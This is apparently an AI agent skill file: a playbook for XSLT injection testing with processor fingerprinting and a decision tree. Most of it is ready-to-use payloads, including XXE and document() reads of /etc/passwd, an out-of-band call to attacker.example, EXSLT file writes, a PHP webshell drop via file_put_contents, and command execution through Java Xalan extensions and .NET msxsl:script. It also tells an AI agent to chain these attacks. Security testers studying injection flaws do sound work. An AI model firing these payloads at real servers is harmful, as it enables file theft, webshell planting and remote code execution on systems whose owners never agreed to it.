---
name: xslt-injection
description: XSLT injection testing — processor fingerprinting (Xalan/Saxon/libxslt/.NET), XXE via XSLT, file read via document(), file write via EXSLT, PHP php:function RCE, Java Saxon/Xalan extensions RCE, .NET msxsl:script RCE. Use when user-controlled XSLT/stylesheet input or transform endpoints are in scope.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: XSLT Injection — Testing Playbook

> **AI LOAD INSTRUCTION**: XSLT injection occurs when attacker-influenced XSLT is compiled/executed server-side. Map the processor family first (Java/.NET/PHP/libxslt). Then chain document(), external entities, EXSLT, or embedded script/extension functions per platform. Routing note: if input is generic XML parsing, cross-load xxe-xml-external-entity; if outbound document(http:...) requests matter, cross-load ssrf-server-side-request-forgery.

## 0. RELATED ROUTING

- xxe-xml-external-entity — DTD/entity hardening, generic XML parsers
- ssrf-server-side-request-forgery — when document(http:...) causes server fetches

---

## 1. QUICK START

1. **Find sinks**: parameters named `xslt`, `stylesheet`, `transform`, `template`, SOAP stylesheets, report generators, XML→HTML converters.
2. **Probe reflection**: inject unique namespace or `xsl:value-of select="'marker'"` — if output changes, execution likely.
3. **Fingerprint** processor (§2).
4. **Escalate** by family: document() / XXE (§3–4), EXSLT write (§5), PHP (§6), Java (§7), .NET (§8).

**Quick probe** (harmless marker):
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="'XSLT_PROBE_OK'"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 2. VENDOR DETECTION

Use standard `system-property` reads inside expressions:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>vendor=</xsl:text><xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>&#10;version=</xsl:text><xsl:value-of select="system-property('xsl:version')"/>
    <xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

| Signal | Engine |
|---|---|
| `Apache Software Foundation` / Xalan markers | Xalan (Java) |
| `Saxonica` / Saxon URI hints | Saxon (Java) |
| `libxslt` / GNOME stack | libxslt (C — often PHP, Nginx modules) |
| Microsoft URLs / MSXML strings | MSXML / .NET XSLT stack |

---

## 3. EXTERNAL ENTITY (XXE VIA XSLT)

XSLT 1.0 allows DTD-based entities in the stylesheet when the parser permits DTDs:

```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="'ENTITY_START'"/>
    <xsl:value-of select="&ext_file;"/>
    <xsl:value-of select="'ENTITY_END'"/>
  </xsl:template>
</xsl:stylesheet>
```

**Note**: Hardened parsers disable external DTDs — failure here does not disprove other XSLT vectors.

---

## 4. FILE READ VIA `document()`

`document()` loads another XML document into a node-set. Local files often parse as XML (noisy) but errors and partial reads may still leak.

**Unix:**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Windows:**
```xml
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

**SSRF / out-of-band:**
```xml
<xsl:copy-of select="document('http://attacker.example/ssrf')"/>
```

Chain with error-based or timing observations if inline data doesn't return to the client.

---

## 5. FILE WRITE VIA EXSLT (`exslt:document`)

When EXSLT common extension is enabled:

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  <xsl:template match="/">
    <exploit:document href="/tmp/evil.txt" method="text">
      <xsl:text>PROOF_CONTENT</xsl:text>
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**Impact**: arbitrary file write where path permissions allow — often RCE via webroot, cron paths, or inclusion points.

---

## 6. RCE VIA PHP (`php:function`)

Requires PHP XSLT with `registerPHPFunctions()`-style exposure (application misconfiguration):

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function('readfile','index.php')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Directory listing:**
```xml
<xsl:value-of select="php:function('scandir','.')"/>
```

**Webshell write (if callable is exposed):**
```xml
<xsl:value-of select="php:function('file_put_contents','/var/www/html/shell.php','&lt;?php system($_GET[cmd]); ?&gt;')"/>
```

**Legacy PHP `/e` modifier pattern** (PHP < 7, lab only):
```php
preg_replace('/.*/e', 'eval(base64_decode("BASE64_PHP_HERE"));', '', 1);
```

---

## 7. RCE VIA JAVA (XALAN EXTENSIONS)

Java engines may expose extension functions mapping to static methods. Requires specific extension namespace binding:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon-style (config-dependent):**
```
Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C ping 127.0.0.1')
```

If extensions are disabled (common secure default), pivot to `document()`, SSRF, or deserialization.

---

## 8. RCE VIA .NET (`msxsl:script`)

When Microsoft XSLT script blocks are allowed:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

Default secure configs often disable scripts — treat this as **when enabled** behavior.

---

## 9. DECISION TREE

```
User influences XSLT or XML transform?
├── NO → out of scope
└── YES
    ├── Output reflects injected logic?
    │   ├── YES → system-property() fingerprint vendor
    │   │   ├── libxslt (PHP) → php:function RCE, document() file read, EXSLT write
    │   │   ├── Java (Xalan/Saxon) → rt:exec extension, document() SSRF
    │   │   └── .NET (MSXML) → msxsl:script C# code execution
    │   └── NO → try blind channels
    │       ├── document('http://attacker/') → OOB SSRF
    │       ├── EXSLT write to detectable path
    │       └── Timing via sleep/complex computation
    │
    ├── DTD allowed? → XXE via entity in stylesheet
    ├── EXSLT enabled? → file write primitive
    └── All execution blocked?
        └── document() SSRF still often works → pivot to SSRF attack chains
```

---

## 10. TOOLING

| Category | Tool/Method |
|---|---|
| Proxy / manual | Burp Suite, OWASP ZAP — replay stylesheet payloads |
| XML/XSLT lab | Match exact processor (PHP libxslt, Java Saxon version, .NET) in a VM |
| Out-of-band | Burp Collaborator / callback server for `document('http://...')` |

No single universal scanner replaces version-specific behavior validation.
